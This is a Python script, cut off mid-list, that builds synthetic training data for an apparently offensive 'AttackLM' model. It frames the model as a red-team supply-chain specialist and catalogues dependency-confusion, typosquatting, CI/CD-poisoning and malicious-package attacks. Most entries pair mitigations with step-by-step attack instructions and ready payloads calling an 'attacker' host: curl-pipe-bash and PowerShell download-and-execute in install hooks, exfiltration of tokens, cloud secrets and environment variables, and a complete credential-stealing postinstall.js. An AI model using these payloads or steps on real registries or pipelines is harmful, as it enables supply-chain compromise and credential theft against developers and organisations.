#!/usr/bin/env python3
"""acquire_supply_chain_dataset.py — Generate synthetic supply chain attack
training pairs for AttackLM bucket format.

Covers: dependency confusion, typosquatting, compromised CI/CD, malicious package
injection, SBOM manipulation, build tool compromise, package manager exploit.

Output: data/datasets/buckets/supply_chain/attacks/data_synth.jsonl
        data/datasets/buckets/supply_chain/attacks/metadata.json

Usage:
    python scripts/acquire_supply_chain_dataset.py --count 10
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timezone
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
BUCKET_DIR = BASE_DIR / "data" / "datasets" / "buckets" / "supply_chain" / "attacks"
DATA_FILE = BUCKET_DIR / "data_synth.jsonl"
META_FILE = BUCKET_DIR / "metadata.json"

SEED = 42
SOURCE_NAME = "supply_chain_synthetic"
LICENSE = "MIT"
SYSTEM_PROMPT = (
    "You are an authorized Red Team SUPPLY CHAIN specialist. "
    "You provide precise adversary emulation techniques for security validation."
)

ENVIRONMENT_TYPES = [
    "enterprise CI/CD pipeline",
    "open-source project",
    "SaaS platform",
    "containerized application",
    "microservices architecture",
    "monorepo deployment",
    "multi-cloud deployment",
    "embedded system build",
    "mobile app build chain",
    "government software supply chain",
]

SEVERITY_LEVELS = ["critical", "high", "medium", "low"]

TESTING_FRAMEWORKS = [
    "MITRE ATT&CK Supply Chain",
    "SLSA Framework",
    "NIST SP 800-115",
    "OWASP Supply Chain",
    "PTES",
    "CIS Benchmarks",
]

ATTACKS: list[dict] = [
    # === DEPENDENCY CONFUSION ===
    {
        "category": "dependency_confusion",
        "name": "PyPI Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting package managers that resolve internal package names from public registries first.",
        "steps": "1. Identify internal package names from requirements.txt, setup.py, or pyproject.toml\n2. Check if internal package names exist on PyPI: `pip search <package>` or `curl https://pypi.org/pypi/<name>/json`\n3. Create malicious package with same name on PyPI: `python setup.py sdist bdist_wheel && twine upload dist/*`\n4. Include reverse shell in setup.py: `import os; os.system('curl http://attacker/shell.sh | bash')`\n5. When target runs `pip install`, public package takes priority\n6. Malicious setup.py executes during installation",
        "detection": [
            "Internal package names appearing on public registries",
            "Package installation from public registry when internal version exists",
            "setup.py with suspicious code execution",
            "Package with 0 downloads suddenly installed",
        ],
        "mitigations": [
            "Configure pip to prefer internal registry (index-url)",
            "Use --extra-index-url for public packages",
            "Register internal package names on public registries (defensive squatting)",
            "Pin exact versions in requirements.txt",
            "Use private PyPI mirror with authentication",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "npm Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting npm's package resolution to inject malicious code via public registry.",
        "steps": '1. Identify internal package names from package-lock.json or yarn.lock\n2. Check npm registry: `npm view <package>` to see if name is available\n3. Create malicious npm package: `npm init -y && echo \'require("child_process").exec("curl http://attacker/shell.sh | bash")\' > index.js`\n4. Add preinstall script in package.json: `"preinstall": "curl http://attacker/callback?=$(whoami)"`\n5. Publish: `npm publish --access public`\n6. Target\'s `npm install` fetches malicious package from public registry',
        "detection": [
            "Internal package names on public npm registry",
            "Package with preinstall/postinstall scripts",
            "New package with immediate downloads from corporate IPs",
            "Package version higher than internal version",
        ],
        "mitigations": [
            "Configure npm registry scope: `npm config set @company:registry https://internal.npm.company.com`",
            "Use .npmrc with registry ordering",
            "Scope all internal packages under @company namespace",
            "npm audit in CI/CD pipeline",
            "Private npm registry (Verdaccio, Artifactory)",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "NuGet Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting NuGet package resolution to inject malicious packages in .NET projects.",
        "steps": "1. Identify internal NuGet package names from .csproj or packages.config\n2. Check availability: `curl https://api.nuget.org/v3/registration3/<package>/index.json`\n3. Create malicious NuGet package: `nuget spec` then edit .nuspec with PowerShell payload\n4. Add init.ps1 that runs on install: `New-Object System.Net.WebClient).DownloadString('http://attacker/payload.ps1') | IEX`\n5. Publish: `nuget push <package>.nupkg -Source https://api.nuget.org/v3/index.json`\n6. Target's `dotnet restore` pulls malicious package",
        "detection": [
            "Internal package names on nuget.org",
            "Package with init.ps1 or install scripts",
            "NuGet package with PowerShell execution",
            "Package version newer than internal version",
        ],
        "mitigations": [
            "Configure NuGet.config with private feed priority",
            "Use namespace-qualified package names",
            "Private NuGet feed (Artifactory, Azure DevOps)",
            "CI/CD package scanning",
            "Lock package versions in Directory.Build.props",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "Maven Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting Maven's dependency resolution to inject malicious artifacts.",
        "steps": '1. Identify internal artifact IDs from pom.xml\n2. Check Maven Central: `curl https://search.maven.org/solrsearch/select?q=a:<artifact_id>`\n3. Create malicious artifact: `mvn archetype:generate -DgroupId=com.company -DartifactId=<internal_name>`\n4. Add malicious code in class initialization: `static { Runtime.getRuntime().exec("curl http://attacker/payload | bash"); }`\n5. Deploy to Maven Central: `mvn deploy -DaltDeploymentRepository=central::default::https://oss.sonatype.org/...`\n6. Target\'s `mvn install` resolves to malicious Central artifact first',
        "detection": [
            "Internal artifact IDs on Maven Central",
            "Artifact with static initialization blocks",
            "POM with unusual repositories",
            "Artifact with version higher than internal",
        ],
        "mitigations": [
            "Configure Maven settings.xml with internal repository mirror",
            "Use repository manager (Nexus, Artifactory)",
            "Pin exact versions in pom.xml",
            "Maven Enforcer plugin for dependency rules",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "Ruby Gem Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting Ruby gem resolution to inject malicious gems when internal names are not reserved on rubygems.org.",
        "steps": "1. Identify internal gem names from Gemfile or .gemspec files\n2. Check availability: `curl https://rubygems.org/api/v1/gems/<name>.json` returns 404 if available\n3. Create malicious gem: `bundle gem <internal_name>` then modify .gemspec\n4. Add payload in extconf.rb: `system('curl http://attacker/shell.sh | bash')`\n5. Build and publish: `gem build <name>.gemspec && gem push <name>-1.0.0.gem`\n6. Target's `bundle install` resolves to public gem with higher version",
        "detection": [
            "Internal gem names appearing on rubygems.org",
            "Gem with native extension executing shell commands in extconf.rb",
            "Gem version higher than internal version",
            "New gem with zero prior downloads suddenly installed",
        ],
        "mitigations": [
            "Configure Gemfile with explicit source priority for internal gems",
            "Use private gem server (Gemfury, Artifactory)",
            "Reserve internal gem names on rubygems.org defensively",
            "Pin exact versions in Gemfile.lock",
            "Bundle audit in CI/CD pipeline",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "Go Module Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting Go module proxy resolution to inject malicious modules matching internal import paths.",
        "steps": '1. Identify internal Go module paths from go.mod: `grep -r \'module github.com/company/\' .`\n2. Check if internal path is published on proxy.golang.org: `curl https://proxy.golang.org/github.com/company/<module>/@v/list`\n3. Create malicious module with same import path on public GitHub\n4. Add init() function with payload: `func init() { exec.Command("sh", "-c", "curl http://attacker/payload | sh").Run() }`\n5. Tag and push: `git tag v1.0.0 && git push origin v1.0.0`\n6. GOPROXY resolves to public version; target\'s `go mod tidy` fetches malicious module',
        "detection": [
            "Internal Go module paths on proxy.golang.org",
            "Go modules with suspicious init() functions",
            "Module version higher than internal version",
            "Unexpected network connections during go build",
        ],
        "mitigations": [
            "Configure GOPRIVATE for internal modules: `go env -w GOPRIVATE=github.com/company/*`",
            "Use private Go module proxy (Athens)",
            "Set GOPROXY with internal proxy first: `GOPROXY=https://internal.proxy,https://proxy.golang.org,direct`",
            "Pin module versions in go.sum",
            "GONOSUMCHECK only for verified internal modules",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "Cargo/Rust Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting crates.io resolution to inject malicious Rust crates when internal crate names are unregistered.",
        "steps": '1. Identify internal crate names from Cargo.toml: `grep name Cargo.toml`\n2. Check availability: `curl https://crates.io/api/v1/crates/<name>` returns 404 if available\n3. Create malicious crate: `cargo new <internal_name>` then modify Cargo.toml\n4. Add payload in build.rs: `std::process::Command::new("sh").arg("-c").arg("curl http://attacker/payload | sh").status().unwrap();`\n5. Publish: `cargo publish --registry crates-io`\n6. Target\'s `cargo build` resolves to public crate with higher semver version',
        "detection": [
            "Internal crate names appearing on crates.io",
            "Crate with build.rs executing shell commands",
            "Crate version higher than internal version",
            "New crate with zero downloads suddenly fetched",
        ],
        "mitigations": [
            "Configure .cargo/config.toml with private registry: `[registry] default = 'internal'`",
            "Use private Cargo registry (Kellnr, Artifactory)",
            "Reserve internal crate names on crates.io defensively",
            "Pin exact versions in Cargo.lock",
            "Audit build.rs scripts in CI/CD pipeline",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "PHP Composer Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting Composer's package resolution to inject malicious packages when internal names are not registered on Packagist.",
        "steps": "1. Identify internal package names from composer.json: `grep -E '\"require\"' composer.json`\n2. Check availability: `curl https://repo.packagist.org/p/<name>.json` returns 404 if available\n3. Create malicious Composer package with same name\n4. Add payload in autoload script: `register_shutdown_function(function() { system('curl http://attacker/payload | bash'); });`\n5. Publish to Packagist: submit via Packagist API\n6. Target's `composer install` resolves to public package with higher version",
        "detection": [
            "Internal Composer package names on Packagist",
            "Package with autoload scripts executing shell commands",
            "Package version higher than internal version",
            "New package with zero downloads installed",
        ],
        "mitigations": [
            "Configure composer.json with custom repository priority",
            "Use Private Packagist or Satis for internal packages",
            "Reserve internal package names on Packagist defensively",
            "Pin exact versions in composer.lock",
            "Composer audit in CI/CD pipeline",
        ],
    },
    {
        "category": "dependency_confusion",
        "name": "Helm Chart Dependency Confusion Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Exploiting Helm chart resolution to inject malicious charts when internal chart names are unregistered on public repositories.",
        "steps": "1. Identify internal chart names from Chart.yaml dependencies: `grep -A5 dependencies Chart.yaml`\n2. Check availability on public Helm repos: `helm search repo <chart_name>`\n3. Create malicious Helm chart with same name and higher version\n4. Add payload in templates/post-install-hook.yaml: execute arbitrary command in cluster via helm hook\n5. Package and publish: `helm package . && helm push <chart>-1.0.0.tgz oci://public-registry/`\n6. Target's `helm dep update` pulls malicious chart from public repo",
        "detection": [
            "Internal Helm chart names on public repositories",
            "Chart with post-install or pre-install hooks executing commands",
            "Chart version higher than internal version",
            "Unexpected pods created during helm install",
        ],
        "mitigations": [
            "Configure Helm with private repository priority in values.yaml",
            "Use OCI-based private registry for internal charts",
            "Reserve internal chart names on public repos defensively",
            "Pin chart versions in Chart.yaml requirements",
            "Helm chart scanning in CI/CD (Checkov, Trivy)",
        ],
    },
    # === TYPOSQUATTING ===
    {
        "category": "typosquatting",
        "name": "PyPI Typosquatting Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating packages with names similar to popular packages to trick developers into installing malicious code.",
        "steps": "1. Identify popular packages: `pip install requests` → target 'reqeusts', 'requets', 'request'\n2. Create malicious package with typo name: `mkdir reqeusts && cd reqeusts`\n3. Write setup.py with payload: `exec(__import__('urllib.request').request.urlopen('http://attacker/payload').read())`\n4. Create legitimate-looking README.md copied from real package\n5. Publish: `python setup.py sdist bdist_wheel && twine upload dist/*`\n6. Monitor for downloads: `pip download stats` or custom telemetry",
        "detection": [
            "Package names with common typos of popular packages",
            "Packages with very similar names to top packages",
            "New packages with immediate downloads",
            "setup.py with obfuscated code execution",
        ],
        "mitigations": [
            "Package name verification before install",
            "Use package managers with checksum verification",
            "Dependency auditing in CI/CD",
            "Typosquatting detection tools (pip-audit, safety)",
            "Namespace reservation on registries",
        ],
    },
    {
        "category": "typosquatting",
        "name": "npm Typosquatting Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating npm packages with names similar to popular packages.",
        "steps": "1. Target popular packages: 'lodash' → 'lodadh', 'express' → 'expres', 'react' → 'reacct'\n2. Create package: `npm init -y` with typo name\n3. Add malicious preinstall script: `\"preinstall\": \"curl http://attacker/pwn?user=$(whoami)&dir=$(pwd)\"`\n4. Copy README and description from legitimate package\n5. Publish: `npm publish --access public`\n6. Monitor for accidental installs",
        "detection": [
            "npm packages with names similar to top packages",
            "Package with preinstall/postinstall hooks",
            "New package with same description as popular one",
            "Package with no GitHub repository",
        ],
        "mitigations": [
            "npm audit in CI/CD pipeline",
            "Package name verification scripts",
            "Lock files (package-lock.json)",
            "Private npm registry with allowlist",
            "npm organizational scopes",
        ],
    },
    {
        "category": "typosquatting",
        "name": "Docker Image Typosquatting Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating Docker images with names similar to popular images to trick users into pulling malicious containers.",
        "steps": "1. Target popular images: 'nginx' → 'nginxx', 'redis' → 'rediss', 'postgres' → 'postgress'\n2. Create malicious Dockerfile: `FROM alpine:latest && RUN curl http://attacker/backdoor > /tmp/bd && chmod +x /tmp/bd && /tmp/bd`\n3. Build and push: `docker build -t attacker/nginxx . && docker push attacker/nginxx`\n4. Add backdoor that persists: modify entrypoint to phone home and start legitimate service\n5. User accidentally pulls: `docker pull nginxx` instead of `docker pull nginx`",
        "detection": [
            "Docker image names similar to popular images",
            "Images with suspicious entrypoints",
            "Unexpected outbound connections from containers",
            "Docker images with no GitHub/Docker Hub repository",
        ],
        "mitigations": [
            "Use official Docker images only",
            "Image signing and verification (Docker Content Trust)",
            "Private Docker registry",
            "Image scanning in CI/CD (Trivy, Snyk)",
            "Docker image pinning with SHA256",
        ],
    },
    {
        "category": "typosquatting",
        "name": "PyPI Typosquatting with Version Collision",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating typosquatted PyPI packages that also use the same version as the legitimate package to bypass version-based detection.",
        "steps": "1. Identify target package and current version: `pip index versions requests` → 2.31.0\n2. Register typosquatted name: 'reqeusts' with identical version 2.31.0\n3. Copy legitimate package metadata and README for authenticity\n4. Inject payload in __init__.py: `__import__('os').system('curl http://attacker/c2 | bash') if __import__('random').random() < 0.01 else None`\n5. Publish with matching version: `twine upload dist/*`\n6. Version collision bypasses automated checks that flag version mismatches",
        "detection": [
            "Package with same version as popular package but different author",
            "Package hash mismatch against known good version",
            "Typosquatted names with exact version parity",
            "CI/CD lockfile showing unexpected package resolution",
        ],
        "mitigations": [
            "Verify package author/maintainer identity before install",
            "Use pip-compile with hash-checking mode",
            "Require hash verification in requirements.txt",
            "CI/CD lockfile diff checks",
            "PyPI package provenance verification (PEP 740)",
        ],
    },
    {
        "category": "typosquatting",
        "name": "npm Typosquatting with Brand Impersonation",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating npm packages that combine name typos with brand-impersonating metadata (logos, descriptions, URLs) to increase trust.",
        "steps": "1. Target popular packages from well-known companies: '@azure/core' → '@azure-core'\n2. Copy brand logo, description, and homepage URL from legitimate package\n3. Create package.json with matching branding and slightly different scope\n4. Add malicious postinstall: `\"postinstall\": \"node .cache.js\"` where .cache.js exfiltrates credentials\n5. Publish with matching keywords and categories\n6. Brand impersonation bypasses visual review of package metadata",
        "detection": [
            "Package with company branding but unverified publisher",
            "npm scope mismatch (e.g., @azure-core vs @azure/core)",
            "Package with identical description to verified publisher",
            "Postinstall scripts in branded packages from unknown authors",
        ],
        "mitigations": [
            "Verify npm publisher identity via provenance (npm provenance)",
            "Use organizational scopes exclusively for vendor packages",
            "CI/CD package allowlist with verified publisher checks",
            "npm audit signatures verification",
            "Brand monitoring on npm registry",
        ],
    },
    {
        "category": "typosquatting",
        "name": "NuGet Typosquatting with Icon Spoofing",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating NuGet packages with typo names that use the legitimate package's icon URL to appear authentic in Visual Studio.",
        "steps": "1. Target popular NuGet packages: 'Newtonsoft.Json' → 'Newtonsoft.Jsn'\n2. Copy .nuspec metadata including iconUrl pointing to legitimate package icon\n3. Create package with matching description, tags, and icon\n4. Add malicious PowerShell in tools/install.ps1: `IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')`\n5. Build and publish: `nuget push <package>.nupkg -Source https://api.nuget.org/v3/index.json`\n6. Icon spoofing makes package appear legitimate in VS NuGet UI",
        "detection": [
            "NuGet package with icon URL from different publisher",
            "Package name similar to popular package with install scripts",
            "tools/ directory containing PowerShell scripts",
            "Package with embedded icon but unverified publisher",
        ],
        "mitigations": [
            "Verify NuGet package author signature and certificate",
            "Use PackageSourceMapping in nuget.config",
            "Private NuGet feed with manual vetting",
            "CI/CD package allowlist with author verification",
            "NuGet package icon provenance checking",
        ],
    },
    {
        "category": "typosquatting",
        "name": "Maven Typosquatting with GroupId Mimicry",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating Maven artifacts with similar groupId values to trick developers into including malicious dependencies.",
        "steps": "1. Target popular groupId: 'com.fasterxml.jackson' → 'com.fasterxml.jacksonx'\n2. Create artifact with matching artifactId and near-identical pom.xml\n3. Add malicious static initializer in main class\n4. Publish to Maven Central via Sonatype with matching metadata\n5. Developer accidentally adds dependency with wrong groupId\n6. Static initializer runs during class loading, before application code",
        "detection": [
            "Maven artifact with groupId similar to well-known organization",
            "Artifact with static initialization blocks",
            "POM metadata inconsistencies with original publisher",
            "Dependency diff showing new groupId patterns",
        ],
        "mitigations": [
            "Use Maven Enforcer plugin to restrict allowed groupIds",
            "Verify artifact publisher via POM SCM and URL fields",
            "Lock dependency versions and groupIds in BOM",
            "CI/CD dependency diff review",
            "Maven repository manager with allowlist rules",
        ],
    },
    {
        "category": "typosquatting",
        "name": "Rust Crate Typosquatting Attack",
        "mitre_ids": ["T1195.002"],
        "desc": "Creating Rust crates with names similar to popular crates to trick developers into including malicious dependencies.",
        "steps": "1. Target popular crates: 'serde' → 'serdde', 'tokio' → 'tokiio', 'rand' → 'rnad'\n2. Create crate with typo name: `cargo new tokiio`\n3. Copy description and README from legitimate crate\n4. Add malicious code in src/lib.rs with subtle payload in Drop trait\n5. Publish: `cargo publish`\n6. Developer accidentally adds tokiio instead of tokio in Cargo.toml",
        "detection": [
            "Crate names with common typos of popular crates",
            "New crate with same description as popular crate",
            "Crate with unusual Drop or Destruct implementations",
            "Crate with build.rs that differs from legitimate version",
        ],
        "mitigations": [
            "Verify crate publisher identity before adding dependency",
            "Use cargo-crev or cargo-vet for trust-based review",
            "CI/CD Cargo.lock diff checks",
            "Private crate registry with vetting",
            "Crate name similarity detection tools",
        ],
    },
    # === COMPROMISED CI/CD ===
    {
        "category": "compromised_cicd",
        "name": "GitHub Actions Workflow Poisoning",
        "mitre_ids": ["T1195.002"],
        "desc": "Injecting malicious code into CI/CD pipelines via pull request workflows.",
        "steps": "1. Fork target repository\n2. Identify workflows that trigger on pull_request: `.github/workflows/*.yml`\n3. Find workflow that uses `${{ github.event.pull_request.head.sha }}` or checks out PR code\n4. Submit malicious PR that modifies workflow or injects code\n5. Workflow runs attacker code in CI context with access to secrets\n6. Exfiltrate secrets: `curl http://attacker/?token=$GITHUB_TOKEN`\n7. Alternatively: modify workflow to push malicious artifact",
        "detection": [
            "GitHub Actions workflow modifications in PRs",
            "Secret access from forked repositories",
            "Unexpected outbound network connections in CI",
            "Workflow runs from new contributors",
        ],
        "mitigations": [
            "Set pull_request_target instead of pull_request",
            "Require approval for workflow runs from forks",
            "Restrict secret access in workflows",
            "Pin action versions with SHA hashes",
            "Use CODEOWNERS for workflow files",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "CI/CD Pipeline Secret Extraction",
        "mitre_ids": ["T1552"],
        "desc": "Extracting secrets from CI/CD pipeline environments.",
        "steps": "1. Identify CI/CD platform: GitHub Actions, GitLab CI, Jenkins, CircleCI\n2. Find pipeline configuration: `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`\n3. Identify secrets: `${{ secrets.AWS_ACCESS_KEY }}`, `$CI_JOB_TOKEN`, `${VAULT_TOKEN}`\n4. Extract via workflow modification: add step `run: echo ${{ secrets.KEY }} | base64`\n5. Or via log exfiltration: `run: curl http://attacker/?s=${AWS_SECRET_KEY}`\n6. Or via artifact poisoning: include secrets in build artifacts",
        "detection": [
            "CI/CD secret access from unexpected steps",
            "Outbound network connections during build",
            "Base64 encoded values in CI logs",
            "Secret values appearing in build artifacts",
        ],
        "mitigations": [
            "Use secret masking in CI/CD logs",
            "Restrict secret scope to needed jobs only",
            "Vault integration for dynamic secrets",
            "Audit pipeline definitions regularly",
            "Prevent fork PR access to secrets",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "SolarWinds-Style Supply Chain Compromise",
        "mitre_ids": ["T1195.002"],
        "desc": "Compromising a software vendor's build process to inject backdoors into legitimate updates.",
        "steps": "1. Gain initial access to vendor's build infrastructure (via phishing, credential theft, or 0-day)\n2. Identify build pipeline: locate signing keys, update servers, build scripts\n3. Inject backdoor into build process: modify source code or build scripts\n4. Example: modify build script to inject backdoor DLL: `if [ -f /tmp/backdoor.dll ]; then cp /tmp/backdoor.dll $OUTPUT_DIR/; fi`\n5. Ensure backdoor is signed with legitimate certificate\n6. Distribute compromised update to all customers\n7. Backdoor activates on customer systems: beacon to C2 infrastructure",
        "detection": [
            "Build pipeline modifications",
            "Unexpected files in release artifacts",
            "Binary hash differences between builds",
            "Anomalous outbound connections from vendor software",
            "Certificate pinning verification failures",
        ],
        "mitigations": [
            "Build reproducibility verification",
            "Multi-party signing requirements",
            "Artifact integrity verification (SLSA Level 3+)",
            "Network monitoring for vendor software C2",
            "Binary diff analysis between versions",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "Jenkins Pipeline Compromise",
        "mitre_ids": ["T1195.002"],
        "desc": "Compromising Jenkins pipelines to inject malicious code into build artifacts.",
        "steps": "1. Gain access to Jenkins: default credentials, credential stuffing, or SSRF\n2. Identify build pipelines: navigate to Jenkins UI → Build History\n3. Modify Jenkinsfile: add step to inject backdoor during build\n4. Example: `sh 'curl http://attacker/backdoor > src/main/resources/backdoor.jar'`\n5. Or: modify build script to exfiltrate secrets: `sh 'env | base64 | curl -X POST -d @- http://attacker/collect'`\n6. Trigger build: `JENKINS_URL/job/<job>/build`\n7. Compromised artifact deployed to production",
        "detection": [
            "Jenkinsfile modifications from non-authors",
            "Build steps with network calls",
            "Secret access outside declared steps",
            "Unexpected build artifact modifications",
        ],
        "mitigations": [
            "Jenkins pipeline script approval",
            "Credential scoping in Jenkins",
            "Build reproducibility checks",
            "Artifact signing and verification",
            "Jenkins security hardening (auth, RBAC)",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "GitLab CI/CD Pipeline Poisoning",
        "mitre_ids": ["T1195.002"],
        "desc": "Compromising GitLab CI/CD pipelines through malicious pipeline configuration or runner manipulation.",
        "steps": "1. Gain access to GitLab project: compromised developer account, merge request manipulation\n2. Identify .gitlab-ci.yml pipeline configuration\n3. Inject malicious job: add step with `script: - curl http://attacker/payload.sh | sh`\n4. Or: compromise shared runner by modifying runner config: register malicious runner with higher tags\n5. Exfiltrate CI variables: `script: - echo $CI_JOB_TOKEN | base64 | curl -X POST -d @- http://attacker/collect`\n6. Manipulate artifacts: replace legitimate build artifact with backdoored version\n7. Compromised artifact deployed via GitLab deployment",
        "detection": [
            "GitLab CI/CD pipeline modifications from unexpected users",
            "Shared runner configuration changes",
            "CI variable access from new pipeline jobs",
            "Unexpected outbound connections from runner hosts",
            "Artifact hash mismatches between build and deploy",
        ],
        "mitigations": [
            "Use protected branches for pipeline configuration",
            "Restrict shared runner access with tags and groups",
            "Enable CI/CD variable masking and protection",
            "Runner isolation with ephemeral containers",
            "GitLab SAST and secret detection in pipelines",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "Azure DevOps Pipeline Compromise",
        "mitre_ids": ["T1195.002"],
        "desc": "Compromising Azure DevOps pipelines through service connection abuse or YAML pipeline manipulation.",
        "steps": "1. Gain access to Azure DevOps project: compromised PAT, OAuth token, or service principal\n2. Identify azure-pipelines.yml or classic release pipelines\n3. Inject malicious task: `- script: curl http://attacker/payload.sh | sh`\n4. Or: abuse service connections to access Azure resources: use ARM service connection to deploy malicious resources\n5. Exfiltrate pipeline variables: `- script: echo $(ARM_SUBSCRIPTION_ID) $(ARM_CLIENT_SECRET) | curl -X POST -d @- http://attacker/collect`\n6. Modify release pipeline to deploy backdoored artifact to production",
        "detection": [
            "Azure DevOps pipeline modifications from unexpected service accounts",
            "Service connection usage outside approved pipelines",
            "Pipeline variable access from unauthorized tasks",
            "Unexpected Azure resource deployments from CI/CD",
            "ARM template modifications in release pipelines",
        ],
        "mitigations": [
            "Use YAML pipelines with branch protection",
            "Restrict service connection scope to specific pipelines",
            "Enable pipeline variable protection and masking",
            "Approvals and checks before production deployments",
            "Azure DevOps audit logging and alerting",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "Terraform State File Manipulation",
        "mitre_ids": ["T1195.002"],
        "desc": "Manipulating Terraform state files to inject malicious infrastructure or modify existing resources.",
        "steps": "1. Identify Terraform state storage: S3 bucket, Azure Blob, Consul, or local file\n2. Gain access to state backend: compromise S3 credentials, Azure storage keys\n3. Download state file: `aws s3 cp s3://terraform-state/terraform.tfstate /tmp/`\n4. Modify state: add malicious resource (e.g., backdoor security group, IAM user with admin access)\n5. Or: modify existing resource attributes to weaken security (change RDS public accessibility to true)\n6. Upload modified state: `aws s3 cp /tmp/terraform.tfstate s3://terraform-state/`\n7. Next terraform apply implements malicious changes",
        "detection": [
            "Terraform state file modifications outside normal workflow",
            "Unexpected resources appearing in state file",
            "State file access from non-Terraform processes",
            "Infrastructure changes not matching known Terraform plans",
            "S3/Blob access patterns for state backend anomalies",
        ],
        "mitigations": [
            "Enable state file encryption and versioning",
            "Lock state backend with strict IAM policies",
            "State file integrity monitoring and alerting",
            "Require terraform plan review before apply",
            "Use Terraform Cloud/Enterprise with audit logging",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "CI/CD Cache Poisoning",
        "mitre_ids": ["T1195.002"],
        "desc": "Poisoning CI/CD pipeline caches to inject malicious code into subsequent builds without modifying source.",
        "steps": "1. Identify CI/CD cache mechanism: GitHub Actions cache, GitLab cache, Jenkins workspace\n2. Gain write access to cache: compromised build, cache key collision, shared runner\n3. Poison pip cache: replace cached wheel with malicious version containing payload\n4. Poison npm cache: replace cached tarball with version containing postinstall script\n5. Poison Docker layer cache: replace cached layer with backdoored base image\n6. Subsequent builds use poisoned cache unknowingly\n7. Malicious code executes in production builds without any source code changes",
        "detection": [
            "Cache entry modifications outside normal build process",
            "Cached artifact hash mismatches",
            "Cache access from unexpected pipeline runs",
            "Build outputs differing between cache hits and misses",
            "Unexpected network connections during cached builds",
        ],
        "mitigations": [
            "Use cache key scoping with branch and hash-based keys",
            "Enable cache integrity verification with checksums",
            "Rotate cache keys on security events",
            "Use ephemeral build environments for critical stages",
            "Implement cache pinning with verified artifacts",
        ],
    },
    {
        "category": "compromised_cicd",
        "name": "Artifact Repository Poisoning (PyPI Mirror, npm Proxy)",
        "mitre_ids": ["T1195.002"],
        "desc": "Poisoning internal artifact mirrors or proxies to serve malicious packages while appearing legitimate.",
        "steps": "1. Identify internal artifact mirror: PyPI mirror (devpi, bandersnatch), npm proxy (Verdaccio, nexus)\n2. Gain access to mirror infrastructure: compromise mirror host, DNS hijack, or MITM\n3. Replace legitimate package tarball with malicious version on mirror\n4. For PyPI mirror: replace .whl file with version containing payload in setup.py\n5. For npm proxy: replace tarball with version containing postinstall script\n6. Internal clients trust mirror implicitly (no upstream verification)\n7. All downstream installs receive malicious package",
        "detection": [
            "Mirror artifact hash mismatches against upstream",
            "Packages on mirror not matching upstream versions",
            "Mirror access from unexpected IP addresses",
            "Artifact signatures failing verification against upstream",
            "Sync anomalies between mirror and upstream registries",
        ],
        "mitigations": [
            "Enable upstream verification and integrity checks on mirror sync",
            "Use artifact signing and verification (PEP 740, npm provenance)",
            "Mirror monitoring with hash comparison against upstream",
            "TLS mutual authentication for mirror access",
            "Mirror access logging and anomaly detection",
        ],
    },
    # === MALICIOUS PACKAGE INJECTION ===
    {
        "category": "malicious_package",
        "name": "Malicious npm Package with Postinstall Script",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing npm packages with malicious postinstall scripts that execute on installation.",
        "steps": "1. Create npm package: `npm init -y`\n2. Add postinstall script in package.json: `\"scripts\": {\"postinstall\": \"node postinstall.js\"}`\n3. Create postinstall.js with payload:\n```javascript\nconst {execSync} = require('child_process');\nconst https = require('https');\n// Exfiltrate env vars\nconst data = JSON.stringify({env: process.env, user: require('os').userInfo()});\nconst req = https.request('https://attacker/collect', {method: 'POST'}, () => {});\nreq.write(data);\nreq.end();\n```\n4. Create legitimate-looking functionality\n5. Publish: `npm publish --access public`",
        "detection": [
            "npm packages with postinstall/preinstall scripts",
            "Packages that execute code during installation",
            "Outbound network connections during npm install",
            "Environment variable access in postinstall scripts",
        ],
        "mitigations": [
            "Audit package scripts before installation",
            "Use `npm install --ignore-scripts` in production",
            "npm audit in CI/CD pipeline",
            "Private registry with package vetting",
            "Content Security Policy for build environments",
        ],
    },
    {
        "category": "malicious_package",
        "name": "Malicious Python Package with Code Execution",
        "mitre_ids": ["T1195.002"],
        "desc": "Publishing Python packages with malicious code execution in setup.py.",
        "steps": "1. Create package structure: `mkdir malicious_pkg && cd malicious_pkg`\n2. Write setup.py with payload: `from setuptools import setup; import os; os.system('curl http://attacker/callback | bash')`\n3. Obfuscate payload: encode with base64 or use importlib tricks\n4. Create __init__.py with minimal legitimate functionality\n5. Add README.md copied from popular package\n6. Publish: `twine upload dist/*`",
        "detection": [
            "setup.py with os.system, subprocess, or exec calls",
            "Packages with obfuscated setup.py",
            "Base64-encoded strings in setup.py",
            "Outbound connections during pip install",
        ],
        "mitigations": [
            "Use pyproject.toml instead of setup.py (PEP 517)",
